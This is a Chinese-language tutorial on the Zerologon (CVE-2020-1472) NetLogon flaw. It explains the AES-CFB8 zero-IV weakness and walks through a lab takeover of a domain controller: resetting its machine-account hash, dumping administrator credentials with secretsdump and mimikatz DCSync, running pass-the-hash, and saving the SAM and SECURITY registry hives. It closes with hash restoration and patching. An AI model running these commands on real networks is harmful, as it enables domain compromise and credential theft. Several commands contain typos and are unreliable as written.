## 漏洞背景

在2020年8月份微软发布的安全公告中，有一个十分紧急的漏洞——CVE-2020-1472 NetLogon
权限提升漏洞。通过该漏洞，未经身份验证的攻击者只需要能访问域控的135端口即可通过 NetLogon
远程协议连接域控并重置域控机器的Hash，从而导致攻击者可以利用域控的机器账户导出域内所有用户的Hash（域控的机器账户默认具有DCSync权限），进而接管整个域。该漏洞存在的原因是Netlogon协议认证的加密模块存在缺陷，导致攻击者可以在没有凭据的情况下通过认证。通过认证后，调用NetLogon协议中RPC函数NetrServerPasswordSet2
来重置域控机器账户的 Hash，从而接管全域。

## 漏洞原理

该漏洞由Secura的安全研究员Tom Tervoort以及国内安全研究员彭峙酿、李雪峰发现。 Tom Tervoort
发布了关于该漏洞的详细原理和利用方式的白皮书，并将其名为ZeroLogon。下面分析NetLogon服务运行的流程和造成该漏洞的原因。

### 1、NetLogon服务

NetLogon服务为域内的身份验证提供一个安全通道，在被用于执行与域用户和机器身份验证相关的各种任务，最常见的是让用户使用NTLM协议登陆服务器。默认情况下，Netlogon
服务在域内所有机器后台运行，该服务的可执行文件路径为 C:\Windows\system32\lsass.exe,如图所示：

![图片.png](https://image.3001.net/images/20230508/1683552257_6458f8019800ed76dd643.png!small)

### 2、Netlogon 认证流程

Netlogon 客户端和服务端之间通过Microsoft Netlogon Remote Protocol（MS-NRPC）来进行通信。MS-NRPC并没有使用与他RPC相同的解决方案。在进行正式通信之前，客户端和服务端之间需要进行身份认证并协商出一个Session
Key，该值用于保护双方的后续的RPC通信流量。

简要的NetLogon认证流程如图所示：

![图片.png](https://image.3001.net/images/20230508/1683552271_6458f80fd0b705c5954e3.png!small)

1） 由客户端启动网络登录会话，客户端调用NetrServerReqChallenge函数给服务端发送随机的8字节的Client Challenge值。  
2）服务端收到客户端发送的NertServerReqChallenge函数调用指令后，服务端也调用NertServerReqChallenge函数发送随机的8字节的Server
Challenge值。  
3）此时，客户端和服务端均收到了来自对方的 Challenge
值，然后双方都是用共享的密钥secret（客户端机器账户的Hash）以及来自对方的Challenge值通过计算得到Session Key[Session
Key=KDF(secert,(Client Challenge+Server Challenge))]。此时，客户端和服务端均拥有了相同的Client
Challenge、Server Challenge、Session Key。  
4）客户端使用Session Key 作为密钥加密Client Challenge 得到 Client Credential
并发送给服务端。服务端收到客户端发来的Client Credential后本地使用Session Key 作为密钥私密加密 Client Challenge
计算出  
Client Credential，然后比较本地计算出的Client Credential和客户端发送来的Client
Credential是否相同。如果两者相同，则说明客户端拥有正确的凭据及Session Key。  
5）服务端使用Session Key 作为密钥加密Server Challenge得到Server
Credential并发送给客户端。客户端收到服务端发来的Server Credential后，本地用Session Key 作为密钥加密Server
Challenge计算出Server Credential，然后比较本地计算出的Server Credential和从服务端发送来的Server
Credential是否相同。如果两者相同，则说明服务端相同的Session Key。  
6）至此，客户端和服务端双方互相认证成功并且拥有相同的Session Key，此后使用Session Key来加密后续的RPC通信流量。

到底是以上哪步出现了问题导致漏洞的产生呢？前两步中的Client Challenge 和 Server Challenge
分别是客户端和服务端随机化生成的8字节Challenge值，这里并没有问题，来看看后面几步。

（1）Session Key的生成  
第3步中的Session Key 是如何加密生成的呢？查看官方文档得知有三种加密算法可供选择，分别为AES、Strong-key和DES。具体使用哪种加密算法由客户端和服务端协商决定。由于目前版本的Windows  
Server 默认都会拒绝的DES和Strong-key加密方案，因此都是协商使用AES进行加密。

客户端和服务端协商使用AES加密后，后续会采用HMAC-SHA256算法来计算Session Key，关于Session  
Key 的生成可以阅读以下图片

![图片.png](https://image.3001.net/images/20230508/1683552303_6458f82fb4f648488029a.png!small)

从官方文档可以得知具体的计算机流程如下：

  * 使用MD4加密算法对共享密钥的Unicode字符串进行散列得到M4SS

  * 以M4SS为密钥采用HMAC-SHA256算法对Client Challenge和Server Challenge进行一系列运算得到Session Key

  * 最终取 Session Key 的 低 16 个字节（128位）作为最终的Session Key。

（2）Credential生成  
再来看看第4、5中的Credential是如何生成的。

查看官方文档得知有两种加密算法可供选择：AES和DES。具体使用哪种加密算法由客户端和服务端协商决定。由于目前版本的Windows
Server默认都拒绝DES加密方案，因此都是协商使用AES进行加密。

![图片.png](https://image.3001.net/images/20230508/1683552320_6458f84005fcfc71213f9.png!small)

客户端和服务端协商使用AES加密后，后续会采用AES-128加密算法在8位CFB模式下(也就是AES-CFB8)计算得到Credential。

现在来看看AES-CFB8加密过程：

![图片.png](https://image.3001.net/images/20230508/1683552331_6458f84bd2b008ee20d45.png!small)

如图所示，首先初始化一个16字节的IV并用Session
Key对其进行AES加密，得到的结果中的第一个字节与8字节的明文input(其实就是Challenge)的第一个字节进行异或运算，将异或的结果放在IV末尾，IV整体向前移一个字节，得到新的IV。然后重复上诉加密、异或、放末尾、移位步骤，直至将所有的明文input加密完毕，得到密文output，密文output与明文input长度相同。

接下来说一说具体加密流程：

  * IV：fab3c65326caafc0cacb21c3f8c19f68

  * 明文input:0102030105060708

第一轮加密：AES(fab3c65326caafc0cacb21c3f8c19f68)=e2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  
第一个字节e2与明文input第一个字节01进行异或运算得到e3，此时IV变成了b3c65326caafc0cacb21c3f8c19f68e3

第二轮加密：AES(b3c65326caafc0cacb21c3f8c19f68e3)=9axxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  
第一个字节9a与明文input的第二个字节02进行异或运算得到98，此时IV变成了c65326caafc0cacb21c3f8c19f68e398

以此类推，经过8轮加密后，密文output为e398f5934212f0ba

从以上流程可以看出，为了完成对明文input的各个字节数据的加密，需要指定一个IV来引导整个过程。IV必需具备随机性，这样对于同一个input才能产生不同的加密结果。问题就在于微软在实现该过程中的IV并不是随机生成的，而是固定值。

### 3、漏洞产生的原因

NetLogon的官方文档MS-NRPC如图所示，可以看到微软使用的是Compute-NetLogonCreadential函数来生成Credential。

![图片.png](https://image.3001.net/images/20230508/1683552347_6458f85be605da7b09840.png!small)

在ComputeNetLogonCreadential函数中将IV初始化为全0的16字节数据，这就导致了AES-CFB8算法出现了漏洞。在认证的过程中计算出的Session
Key是随机的，那么对全为0的IV有1/256的概率使得output也全为0。由于NetLogon协议对机器账户的认证次数没有没有限制，因此攻击者可以不断尝试来通过身份认证。

如图所示，对全为0的IV有一定概率导致output也全为0

![图片.png](https://image.3001.net/images/20230508/1683552361_6458f86934c3f9d0dcda1.png!small)

接下来具体说明漏洞产生的具体流程：

假设IV和明文input全为0

  * IV：00000000000000000000000000000000000

  * 明文input：00000000000000

第一轮加密：  
AES(00000000000000000000000000000000000)=00000000000000000000000000000000000  
第一个字节00与明文00的第一个字节00进行异或运算得到00，此时IV不变，还是00000000000000000000000000000000000

第二轮加密：  
AES(00000000000000000000000000000000000)=00000000000000000000000000000000000  
第一个字节00与明文00的第二个字节00进行异或运算得到00，此时IV不变，还是00000000000000000000000000000000000

以此类推，经过8轮加密后，密文output为00000000000000

以上是一中理想状况，假设存在一个Session Key，使得其对全为0的IV进行AES运算的结果的第一个字节为0.但在实际情况中，Session
Key是随机生成的，而用随机生成的Session Key 对全为0的IV进行AES运算的结果第一个字节为0的概率为1/256

在实际的脚本中，安全研究员正是通过控制明文input的值来匹配输出全为0的Session Key，从而通过认证的。

### 4、绕过签名校验

还有一个需要注意的细节，在认证通过后，后续客户端和服务端通信的流量都是通过Session
Key进行加密的，而安全研究员是通过密文output输出为全为0来绕过认证的。因此，安全研究员并不知道Session
Key的值，自然也就无法对后续的通信流量进行加密。但是通过查看官方文档可知，可以通过取消设置的标志位来关闭这个签名，即通过设置Flags为0x212fffff来关闭签名。

## 漏洞影响的版本

  * Windows Server 2008 R2 for x64-based Systems Service Pack 1

  * Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)

  * Windows Server 2012

  * Windows Server 2012 (Server Core installation)

  * Windows Server 2012 R2

  * Windows Server 2012 R2 (Server Core installation)

  * Windows Server 2016

  * Windows Server 2016 (Server Core installation)

  * Windows Server 2019

  * Windows Server 2019 (Server Core installation)

  * Windows Server, version 1903 (Server Core installation)

  * Windows Server, version 1909 (Server Core installation)

  * Windows Server, version 2004 (Server Core installation)

## 漏洞复现

试验环境如下：

  * 域控IP：192.168.41.10

  * 域控主机名：DC

下面分别使用Python脚本和mimikatz对该漏洞进行复现

漏洞测试工具：zerologon_tester  
https://github.com/SecuraBV/CVE-2020-1472

漏洞利用工具：  
https://github.com/risksense/zerologon  
https://github.com/dirkjanm/CVE-2020-1472

网络协议工具：impacket  
https://github.com/SecureAuthCorp/impacket

### 1、Python脚本复现

这里使用zerologon_tester.py脚本和CVE-2020-1472.py脚本对NetLogon权限提升漏洞进行检测和利用。

（1）检测是否存在漏洞  
使用zerologon_tester.py脚本执行如下的命令检测目标域控是否存在NetLogon权限提升漏洞：

    
    
    python3 zerologon_tester.py DC 192.168.41.10
    

结果如图所示，提示，"Success! DC can be fully compromised by a Zerologon
attack."说明目标域控存在NetLogon权限提升漏洞。

![图片.png](https://image.3001.net/images/20230508/1683552379_6458f87b98f3a7c4f35b4.png!small)

（2）重置域控Hash  
确定目标域控存在NetLogon权限提升，使用CVE-2020-1472.py脚本执行如下命令对其攻击：

    
    
    python3 cve-2020-1472-exploit.py DC 192.168.41.10
    

结果如图所示，该脚本会将目标域控的机器账户的Hash置空，可以看到攻击成功

![图片.png](https://image.3001.net/images/20230508/1683552391_6458f88761ae81e517816.png!small)

（3）远程连接域控

攻击成功后，此时目标域控的机器账户DC$的密码已经被置空了。由于域控机器账户默认在域内具有DCSync权限。因此，可以使用目标域控的机器账户DC$远程连接域控，指定Hash为空，使用secretsdump.py脚本到处域内任意用户的Hash。如下的命令导出域管理员administrator的Hash。

    
    
    #使用机器账户DC$,置Hash为空，导出administrator的Hash
    #aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0是空值的HASH
    secretsdump.exe "hack.com/DC$"@192.168.41.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user "administrator"
    

![图片.png](https://image.3001.net/images/20230508/1683552404_6458f89423edde3369a59.png!small)

接下来在使用该Hash远程连接域控，如图所示

    
    
    #使用用户administrator的Hash 远程连接
    python3 smbexec.py hack.com/administrator@192.168.41.10 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
    

![图片.png](https://image.3001.net/images/20230508/1683552421_6458f8a5e3866aa9bf9f7.png!small)

### 2、mimikatz复现

新版本的mimikatz已经集成了NetLogon权限提升漏洞检测和利用模块，可以直接利用mimikatz来检测和利用。  
（1）检测是否存在漏洞  
使用mimikatz执行如下的命令检测目标域控是否存在NetLogon权限提升漏洞：

    
    
    mimikatz.exe "privilege::debug" "lsadump::zerologon /target:192.168.41.10 /account:DC$" "exit"
    

结果如图所示，提示"Authentication: OK -- vulnerable",即可证明目标域控存在NetLogon权限提升漏洞。

![图片.png](https://image.3001.net/images/20230508/1683552437_6458f8b5804781d6d1fb6.png!small)

（2）重置域控Hash

使用mimikatz执行如下的命令重置域控域控的Hash。/target参数指定域控的IP地址，/account参数指定域控的机器账户，如图所示，成功将域控机器账户的DC$的Hash为空。

    
    
    mimikatz.exe "lsadump::zerologon /target:192.168.41.10 /ntlm /null /account:DC$ /expolit" "exit"
    

![图片.png](https://image.3001.net/images/20230508/1683552451_6458f8c3415bc98decd12.png!small)

（3）远程连接域控

攻击成功后，此时目标域控的机器账户DC$的密码已经被置空了。由于域控机器账户默认在域内具有DCSync权限，因此可以使用目标域控机器账户DC$远程连接域控，指定Hash为空，然后使用DCSync导出域内任意用户的Hash

在使用mimikatz并利用DCSync功能导出Hash的过程中，由于/dc参数后面要跟域名格式的FQDN，因此如果当前机器不在域内，需要将当前机器的的DNS指定为域控，这样才能解析。如果当前机器在域内，则不用进行任何配置

使用mimikatz执行如下的命令，先导出域管理员administrator的Hash，然后使用域管理员administrator的Hash远程连接域控。

    
    
    #导出用户administrator的Hash
    mimikatz.exe "lsadump::dcsync /csv /domain:hack.com /dc:DC.hack.com /user:administrator /authuser:DC$ /authpassword:\"\" /atthntlm" "exit"
    

![图片.png](https://image.3001.net/images/20230508/1683552466_6458f8d220f1cd2216ef4.png!small)

    
    
    #使用用户administrator的Hash远程连接域控
    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:192.168.41.10 /rc4:32ed87bd5fdc5e9cba88547376818d4" "exit"
    

如图所示，使用域管理员进行PTH，可以看到成功访问域控DC

![图片.png](https://image.3001.net/images/20230508/1683552504_6458f8f8751f36fa595ca.png!small)

## 恢复域控机器账户的Hash

在攻击完成后，域控机器的Hash置空了。此时域控机器账户在活动目录中的密码和域控本地注册表中以及lsass进程中的密码不一致，导致域控重启后无法开机、脱域等情况。因此，得想办法让域控在活动目录中的密码和在域控本地注册表及lsass京城这的密码一致。

这里有两种方案：一种是获得域控机器账户的原始Hash，然后将其恢复到原始的Hash；另一种方案是重置域控在活动目录、本地注册表和lsass进程中的Hash，使得三者一致（此时域控机器账户的Hash和原始的Hash不一致）

### 1、获得域控机器账户的原始Hash

我们先来看看第一种方案，先获得域控机器账户的原始Hash，然后恢复。获得域控机器账户的原始Hash有如下几种方案：

（1） 方案一，在目标域控上执行如下的3个命令，将注册表中的信息导出为3个文件：

    
    
    reg save HKLM\SYSTEM system.save
    reg save HKLM\SAM sam.save
    reg save HKLM\SECURITY security.save
    

![图片.png](https://image.3001.net/images/20230508/1683552517_6458f90568e30ee8964f1.png!small)

将刚导出的三个文件保存在Impacket的examples目录下，使用secretsdump.py文件执行如下的命令提取出文件中的Hash
如图所示,$MACHINE.ACC后面的209366c6c5292a7a6f3add57ad356ee5就是域控机器账户DC$的原始Hash

    
    
    python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
    

![图片.png](https://image.3001.net/images/20230508/1683552533_6458f91558cd8bb16b81e.png!small)

（2）方案二。使用mimikatz执行如下的命令，从lsass进程中抓取域控机器账户DC$的原始Hash

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    

![图片.png](https://image.3001.net/images/20230508/1683552552_6458f9285b8e7b31edc31.png!small)

(3)方案三。使用secretsdump.exe执行如下的命令，启用卷影复制服务（Volume Shadow copy
Service，VSS）导出域内所有的Hash，其中就包含域内机器账户的Hash

    
    
    secretsdump.exe hack.com/administrator@192.168.41.10 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 -use-vss
    

![图片.png](https://image.3001.net/images/20230508/1683552568_6458f93841e32300e5b6c.png!small)

### 2、恢复域控原始Hash

使用上面的方法获得了域控机器账户的原始Hash后，再使用reinstall_original_pw.py脚本执行如下的命令恢复域控机器账户的原始Hash。该脚本在计算密码的时候使用了空密码的Hash去计算Session
Key，然后指定机器账户的原始NTLM Hash 即可还原。

    
    
    #恢复域控原始Hash
    python3 reinstall_original_pw.py DC 192.168.41.10 209366c6c5292a7a6f3add57ad356ee5
    

如图所示，使用reinstall_original_pw.py脚本恢复域控DC机器账户的Hash。

![图片.png](https://image.3001.net/images/20230508/1683552584_6458f94895d75294cc956.png!small)

恢复成功后，使用secretsdump.exe执行如下的命令导出域控DC的机器账户DC$的Hash确认是否恢复完成。

    
    
    secretsdump.exe hack.com/administrator@192.168.41.10 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 -just-dc-user "DC$"
    

![图片.png](https://image.3001.net/images/20230508/1683552601_6458f9598cf9d181308b5.png!small)

如图所示，域控机器账户DC$的密码已经被恢复成功

### 3、使用powershell命令重置Hash

也可以直接在域控上执行如下的Powershell命令，该命令会重置计算机的机器账户密码，重置后，活动目录数据库、注册表、lsass进程中的密码均一致，但重置后的密码与原始密码不一致。

    
    
    PowerShell Reset-ComputerMachinePassword
    

## 漏洞预防和修复

对于防守方或蓝队来说，如何针对NetLogon权限提升漏洞进行预防和修复呢？

微软已经发布了该漏洞的补丁程序，可以直接通过Windows自动跟新解决以上的问题。

